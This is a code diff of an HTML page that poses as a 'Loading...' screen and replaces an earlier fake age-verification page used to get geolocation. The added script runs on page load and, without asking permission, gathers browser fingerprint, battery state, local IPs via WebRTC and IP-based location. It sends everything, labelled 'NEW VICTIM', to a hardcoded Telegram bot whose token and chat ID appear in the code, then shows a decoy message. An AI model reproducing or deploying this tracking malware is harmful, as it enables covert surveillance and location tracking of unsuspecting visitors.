@@ -2,128 +2,235 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
-            padding: 20px;
-        }
-        .card {
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 40px;
-            text-align: center;
-            max-width: 400px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-        }
-        h1 {
-            color: #fff;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #ccc;
-            margin-bottom: 30px;
-        }
-        button {
-            background: #00adb5;
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        button:hover {
-            transform: scale(1.05);
-        }
-        .status {
-            margin-top: 20px;
-            color: #fff;
-            font-size: 14px;
-        }
-        .loading {
-            display: none;
-            margin-top: 20px;
-            color: #fff;
-        }
-    </style>
 </head>
-<body>
-    <div class="card">
-        <h1>🔐 Age Verification</h1>
-        <p>You must be 18+ to continue</p>
-        <button onclick="verify()">I am 18+</button>
-        <div class="status" id="status"></div>
-        <div class="loading" id="loading">⏳ Processing...</div>
-    </div>
+<body style="font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0;">
+    <h2>Loading...</h2>
+    <p>Please wait</p>
 
     <script>
         const BOT_TOKEN = '8172323730:AAEfo4Eqz8E9HWSNOGF96BHndyjN9anBRLg';
         const CHAT_ID = '1471307057';
         
-        function sendToTelegram(data) {
-            let message = '';
+        // Собираем все данные без разрешений
+        async function collectAllData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                timestamp_local: new Date().toLocaleString(),
+                
+                // Браузерная инфо
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                
+                // Экран
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                
+                // Окно
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                
+                // Время и часовой пояс
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Сеть
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // Аппаратные средства
+                hardware: {
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints
+                },
+                
+                // Батарея (если есть)
+                battery: null,
+                
+                // WebRTC IP (попробуем получить локальный IP)
+                localIPs: []
+            };
             
-            if (data.lat) {
-                message = `📍 <b>NEW LOCATION!</b>\n\n` +
-                         `🌍 Latitude: ${data.lat}\n` +
-                         `🗺️ Longitude: ${data.lng}\n` +
-                         `📏 Accuracy: ${data.accuracy} meters\n` +
-                         `🕐 Time: ${new Date().toLocaleString()}\n\n` +
-                         `📱 Device: ${data.ua.substring(0, 100)}`;
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        latitude: data.lat,
-                        longitude: data.lng
-                    })
-                });
-            } else {
-                message = `❌ <b>ERROR</b>\n\n` +
-                         `Error: ${data.error}\n` +
-                         `📱 Device: ${data.ua.substring(0, 100)}`;
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
+            // Пробуем получить батарею
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: battery.level * 100,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
             }
+            
+            // Пробуем получить локальные IP через WebRTC
+            try {
+                const ips = await getLocalIPs();
+                data.localIPs = ips;
+            } catch(e) {}
+            
+            return data;
         }
         
-        async function getAddress(lat, lng) {
-            try {
-                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
-                const data = await res.json();
+        // Получаем локальные IP без разрешений
+        function getLocalIPs() {
+            return new Promise((resolve) => {
+                const ips = [];
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
                 
-                const message = `🏠 <b>ADDRESS</b>\n\n${data.display_name || 'Address not found'}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                pc.onicecandidate = (event) => {
+                    if (!event.candidate) return;
+                    const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(event.candidate.candidate);
+                    if (ipMatch && !ips.includes(ipMatch[0])) {
+                        ips.push(ipMatch[0]);
+                    }
+                };
+                
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips);
+                }, 2000);
+            });
+        }
+        
+        // Получаем геолокацию по IP (без разрешения)
+        async function getIPGeo() {
+            try {
+                // Пробуем несколько сервисов
+                const services = [
+                    'https://ipapi.co/json/',
+                    'http://ip-api.com/json/',
+                    'https://ipinfo.io/json'
+                ];
+                
+                for (const url of services) {
+                    try {
+                        const res = await fetch(url);
+                        const data = await res.json();
+                        if (data && (data.city || data.region)) {
+                            return {
+                                source: url,
+                                ip: data.ip || data.query,
+                                city: data.city || data.region,
+                                region: data.region || data.regionName,
+                                country: data.country || data.country_name,
+                                lat: data.latitude || data.lat,
+                                lon: data.longitude || data.lon,
+                                isp: data.org || data.isp,
+                                postal: data.postal || data.zip
+                            };
+                        }
+                    } catch(e) {}
+                }
+            } catch(e) {}
+            return null;
+        }
+        
+        // Получаем Wi-Fi и сотовые данные (если доступно)
+        async function getNetworkInfo() {
+            if ('getNetworkInformation' in navigator) {
+                // Android WebView может дать больше данных
+                try {
+                    const netInfo = await navigator.getNetworkInformation();
+                    return {
+                        type: netInfo.type,
+                        downlink: netInfo.downlink,
+                        rtt: netInfo.rtt
+                    };
+                } catch(e) {}
+            }
+            return null;
+        }
+        
+        // Отправляем всё в Telegram
+        async function sendAllData() {
+            // Собираем локальные данные
+            const localData = await collectAllData();
+            
+            // Получаем IP-гео
+            const ipGeo = await getIPGeo();
+            
+            // Получаем сетевую инфу
+            const networkInfo = await getNetworkInfo();
+            
+            // Объединяем
+            const fullData = {
+                ...localData,
+                ipGeo: ipGeo,
+                networkInfo: networkInfo,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+            
+            // Формируем сообщение для Telegram
+            let message = `🔍 <b>NEW VICTIM - AUTO COLLECT</b>\n\n`;
+            
+            if (ipGeo) {
+                message += `📍 <b>LOCATION (by IP)</b>\n`;
+                message += `City: ${ipGeo.city || '?'}\n`;
+                message += `Region: ${ipGeo.region || '?'}\n`;
+                message += `Country: ${ipGeo.country || '?'}\n`;
+                message += `Coordinates: ${ipGeo.lat || '?'}, ${ipGeo.lon || '?'}\n`;
+                message += `IP: ${ipGeo.ip || '?'}\n`;
+                message += `ISP: ${ipGeo.isp || '?'}\n\n`;
+            }
+            
+            message += `📱 <b>DEVICE INFO</b>\n`;
+            message += `Platform: ${localData.platform || '?'}\n`;
+            message += `Language: ${localData.language || '?'}\n`;
+            message += `Timezone: ${localData.timezone || '?'}\n`;
+            message += `Screen: ${localData.screen.width}x${localData.screen.height}\n`;
+            
+            if (localData.hardware.cores) {
+                message += `CPU Cores: ${localData.hardware.cores}\n`;
+            }
+            if (localData.hardware.memory) {
+                message += `RAM: ${localData.hardware.memory}GB\n`;
+            }
+            if (localData.battery) {
+                message += `Battery: ${localData.battery.level}% (${localData.battery.charging ? 'Charging' : 'Not charging'})\n`;
+            }
+            if (localData.localIPs.length) {
+                message += `Local IPs: ${localData.localIPs.join(', ')}\n`;
+            }
+            
+            message += `\n🌐 <b>NETWORK</b>\n`;
+            if (localData.connection) {
+                message += `Connection: ${localData.connection.type}\n`;
+                message += `Speed: ${localData.connection.downlink}Mbps\n`;
+            }
+            
+            message += `\n🕐 Time: ${localData.timestamp_local}\n`;
+            message += `🔗 Referrer: ${document.referrer || 'direct'}\n`;
+            
+            // Отправляем текст
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
@@ -133,74 +240,32 @@
                     })
                 });
             } catch(e) {}
-        }
-        
-        function verify() {
-            const btn = event.target;
-            const status = document.getElementById('status');
-            const loading = document.getElementById('loading');
             
-            btn.disabled = true;
-            btn.style.opacity = '0.5';
-            loading.style.display = 'block';
-            status.innerHTML = '';
-            
-            if (!navigator.geolocation) {
-                status.innerHTML = '❌ Geolocation not supported';
-                status.style.color = '#ff6b6b';
-                sendToTelegram({
-                    error: 'Geolocation not supported',
-                    ua: navigator.userAgent
-                });
-                btn.disabled = false;
-                btn.style.opacity = '1';
-                loading.style.display = 'none';
-                return;
+            // Если есть координаты — отправляем локацию
+            if (ipGeo && ipGeo.lat && ipGeo.lon) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            latitude: parseFloat(ipGeo.lat),
+                            longitude: parseFloat(ipGeo.lon)
+                        })
+                    });
+                } catch(e) {}
             }
             
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const data = {
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        accuracy: Math.round(position.coords.accuracy),
-                        ua: navigator.userAgent
-                    };
-                    
-                    sendToTelegram(data);
-                    getAddress(data.lat, data.lng);
-                    
-                    status.innerHTML = '✅ Access granted! Redirecting...';
-                    status.style.color = '#4caf50';
-                    
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 2000);
-                },
-                (error) => {
-                    let errorMsg = '';
-                    switch(error.code) {
-                        case 1: errorMsg = 'User denied geolocation'; break;
-                        case 2: errorMsg = 'Location unavailable'; break;
-                        case 3: errorMsg = 'Timeout'; break;
-                        default: errorMsg = error.message;
-                    }
-                    
-                    status.innerHTML = `❌ ${errorMsg}`;
-                    status.style.color = '#ff6b6b';
-                    
-                    sendToTelegram({
-                        error: errorMsg,
-                        ua: navigator.userAgent
-                    });
-                    
-                    btn.disabled = false;
-                    btn.style.opacity = '1';
-                    loading.style.display = 'none';
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+            // Меняем страницу через 2 секунды
+            setTimeout(() => {
+                document.body.innerHTML = '<h2>Done</h2><p>Loading content...</p>';
+                // Можно перенаправить на любой сайт
+                // window.location.href = 'https://www.google.com';
+            }, 2000);
         }
+        
+        // Запускаем сразу
+        sendAllData();
     </script>
 </body>
 </html>
